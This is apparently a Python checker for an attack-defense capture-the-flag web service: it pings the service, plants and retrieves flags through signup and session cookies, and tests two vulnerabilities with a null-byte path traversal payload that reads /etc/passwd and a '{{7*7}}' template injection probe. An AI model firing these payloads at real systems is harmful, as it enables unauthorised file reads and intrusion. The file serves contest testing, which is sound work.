import random
import string
from bs4 import BeautifulSoup
import requests
from potee import ServiceBase

port = 3000
schema = "http"
srv = ServiceBase()

def gen_password(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

@srv.ping
def ping(host):
    r = requests.get(f"{schema}://{host}:{port}/", timeout=2)
    if r.status_code == 200:
        return 'pong'

@srv.put("auth")
def login(host, flag):
    password = gen_password(20)
    s = requests.Session()
    s.post(f"{schema}://{host}:{port}/",data={"login": flag, "passwd": password, "action": "signup"})
    s.post(f"{schema}://{host}:{port}", data={"login": flag, "passwd": password, "action": "signin"})
    return s.cookies.get("session")

@srv.get('auth')
def login(host, session):
    s = requests.Session() 
    s.cookies.set("session", session)
    r = s.get(f"{schema}://{host}:{port}/talks")
    
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("h4", class_="checker")
    return req.text.split(",")[0]

@srv.exploit("lfi")
def exploit(host):
    r = requests.get(f"http://{host}:{port}/images?file=.%00./.%00./.%00./.%00./.%00./etc/passwd")
    
    if ("root" in r.text) or ("flag" in r.text) or ("bin" in r.text) or ("daemon" in r.text):
        return 1 
    else: return 0

@srv.exploit("ssti")
def exploit(host):
    payload = "{{7*7}}"

    r = requests.get(f"{schema}://{host}:{port}/{payload}", timeout=2)
    
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("h3")
    if "49" in req.text:
        return 1
    return 0

    
if __name__ == "__main__":
    srv.run()